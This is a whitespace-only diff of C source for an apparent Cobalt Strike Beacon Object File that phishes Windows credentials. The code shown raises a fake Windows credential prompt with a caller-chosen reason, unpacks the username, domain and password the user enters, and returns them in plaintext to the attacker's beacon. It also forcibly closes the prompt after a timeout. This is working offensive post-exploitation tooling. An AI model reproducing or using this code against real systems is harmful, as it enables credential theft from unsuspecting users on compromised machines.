@@ -1,4 +1,4 @@
-#define SECURITY_WIN32 
+#define SECURITY_WIN32
 
 #include <windows.h>
 #include <wincred.h>
@@ -16,7 +16,7 @@
 BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
 	PCHAR pWindowTitle = NULL;
 	LPWSTR pExeName = NULL;
-	DWORD dwProcId = 0; 
+	DWORD dwProcId = 0;
 
 	if (!hWnd) {
 		return TRUE;
@@ -125,17 +125,17 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 	}
 
 	dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
-		&credUiInfo, 0, 
-		&authPackage, 
-		inCredBuffer, 
-		inCredSize, 
-		&outCredBuffer, 
-		&outCredSize, 
-		&bSave, 
+		&credUiInfo, 0,
+		&authPackage,
+		inCredBuffer,
+		inCredSize,
+		&outCredBuffer,
+		&outCredSize,
+		&bSave,
 		CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
 		);
-	
-	if (dwRet == ERROR_SUCCESS) { 
+
+	if (dwRet == ERROR_SUCCESS) {
 		WCHAR szUsername[MAXLEN + 1];
 		WCHAR szPasswd[MAXLEN + 1];
 		WCHAR szDomain[MAXLEN + 1];
@@ -145,13 +145,13 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 
 		if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, szPasswd, &maxLenPassword)) {
 			if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
-				BeaconPrintf(CALLBACK_OUTPUT, 
+				BeaconPrintf(CALLBACK_OUTPUT,
 					"[+] Username: %ls\n"
 					"[+] Password: %ls\n", szUsername, szPasswd);
 
 			}
 			else {
-				BeaconPrintf(CALLBACK_OUTPUT, 
+				BeaconPrintf(CALLBACK_OUTPUT,
 					"[+] Username: %ls\n"
 					"[+] Domainname: %ls\n"
 					"[+] Password: %ls\n", szUsername, szDomain, szPasswd);
@@ -186,7 +186,7 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 
 	// Parse Arguments
 	datap parser;
-	BeaconDataParse(&parser, Args, Length);	
+	BeaconDataParse(&parser, Args, Length);
 	lpwReason = (WCHAR*)BeaconDataExtract(&parser, NULL);
 	if (lpwReason == NULL) {
 		lpwReason = REASON;
@@ -199,7 +199,7 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 	}
 
 	dwResult = KERNEL32$WaitForSingleObject(hThread, dwTimeOut);
-	if (dwResult == WAIT_TIMEOUT) {  
+	if (dwResult == WAIT_TIMEOUT) {
 		BeaconPrintf(CALLBACK_ERROR, "ThreadId: %d timed out, closing Window.\n", ThreadId);
 		if (!USER32$EnumWindows(EnumWindowsProc, (LPARAM)NULL)) { // Cancel operation by closing Window.
 			KERNEL32$TerminateThread(hThread, 0); // Only if WM_CLOSE failed, very dirty..
